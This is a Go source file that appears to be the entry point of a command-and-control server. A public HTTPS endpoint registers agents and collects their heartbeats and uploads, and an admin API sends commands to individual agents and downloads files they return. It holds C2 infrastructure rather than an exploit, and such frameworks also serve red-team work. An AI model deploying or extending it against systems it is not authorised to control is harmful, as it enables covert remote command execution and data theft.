package main

import (
	"c2/config"
	"c2/database"
	_ "c2/docs"
	"c2/handlers/admin"
	"c2/handlers/agent"
	"c2/middleware"
	"c2/utils"
	"context"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/gorilla/mux"
	httpSwagger "github.com/swaggo/http-swagger"
	"golang.org/x/crypto/acme/autocert"
)

func main() {
	config.LoadEnv()

	logFile, err := utils.SetupLogger()
	if err != nil {
		log.Fatalf("[!] Gagal setup logger: %v", err)
	}
	defer logFile.Close()

	database.Setup()

	publicRouter := mux.NewRouter()
	publicRouter.PathPrefix("/swagger/").Handler(httpSwagger.WrapHandler)
	publicRouter.Use(middleware.RecoverMiddleware, middleware.SecurityHeaders)

	public := publicRouter.NewRoute().Subrouter()
	public.Use(middleware.RateLimitMiddleware)
	public.Handle("/agent/register", middleware.VerifyAgentSignature(http.HandlerFunc(agent.RegisterAgent))).Methods("POST")
	public.HandleFunc("/agent/result", agent.SubmitResult).Methods("POST")

	authAgent := publicRouter.PathPrefix("/agent").Subrouter()
	authAgent.Use(middleware.ValidateJWT)
	authAgent.HandleFunc("/heartbeat", agent.Heartbeat).Methods("POST")
	authAgent.HandleFunc("/upload", agent.UploadResult).Methods("POST")

	publicHandler := middleware.EnableCORS(publicRouter)

	adminRouter := mux.NewRouter()
	adminRouter.PathPrefix("/swagger/").Handler(httpSwagger.WrapHandler)
	adminRouter.Use(middleware.RecoverMiddleware, middleware.SecurityHeaders)

	adminPublic := adminRouter.NewRoute().Subrouter()
	adminPublic.Use(middleware.RateLimitMiddleware)
	adminPublic.HandleFunc("/admin/register", admin.RegisterAdmin).Methods("POST")
	adminPublic.HandleFunc("/admin/login", admin.LoginAdmin).Methods("POST")

	adminPrivate := adminRouter.PathPrefix("/admin").Subrouter()
	adminPrivate.Use(middleware.ValidateJWT)
	adminPrivate.HandleFunc("/agents", admin.GetAllAgentsHandler).Methods("GET")
	adminPrivate.HandleFunc("/delete_agent/{agent_id}", admin.DeleteAgentHandler).Methods("DELETE")
	adminPrivate.HandleFunc("/update_meta/{agent_id}", admin.UpdateTagsAndNotes).Methods("PATCH")
	adminPrivate.HandleFunc("/command/{agent_id}/send", admin.SendCommand).Methods("POST")
	adminPrivate.HandleFunc("/command/{agent_id}", admin.GetCommandsByAgent).Methods("GET")
	adminPrivate.HandleFunc("/command/{command_id}/download", admin.DownloadFile).Methods("GET")
	adminPrivate.HandleFunc("/admin/command/{id}", admin.DeleteCommand).Methods("DELETE")

	internalHandler := middleware.EnableCORS(adminRouter)

	domain := config.Domain
	certManager := autocert.Manager{
		Prompt:     autocert.AcceptTOS,
		HostPolicy: autocert.HostWhitelist(domain),
		Cache:      autocert.DirCache("certs"),
	}

	go func() {
		log.Println("[*] HTTP (Let's Encrypt challenge) started on :80")
		err := http.ListenAndServe(":80", certManager.HTTPHandler(nil))
		if err != nil {
			log.Fatalf("[!] HTTP server error: %v", err)
		}
	}()

	publicServer := &http.Server{
		Addr:      ":443",
		Handler:   publicHandler,
		TLSConfig: certManager.TLSConfig(),
	}

	internalServer := &http.Server{
		Addr:    ":8443",
		Handler: internalHandler,
	}

	go func() {
		log.Println("[*] Public HTTPS server (Agent) on :443")
		if err := publicServer.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
			log.Fatalf("[!] Public server error: %v", err)
		}
	}()

	go func() {
		log.Println("[*] Internal HTTPS server (Admin) on :8443")
		if err := internalServer.ListenAndServeTLS("config/ssl/internal.pem", "config/ssl/internal.key"); err != nil && err != http.ErrServerClosed {
			log.Fatalf("[!] Internal server error: %v", err)
		}
	}()

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
	<-stop

	log.Println("[*] Shutting down servers...")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	if err := publicServer.Shutdown(ctx); err != nil {
		log.Printf("[!] Error shutting down public server: %v", err)
	}
	if err := internalServer.Shutdown(ctx); err != nil {
		log.Printf("[!] Error shutting down internal server: %v", err)
	}

	log.Println("[*] All servers shut down cleanly.")
}
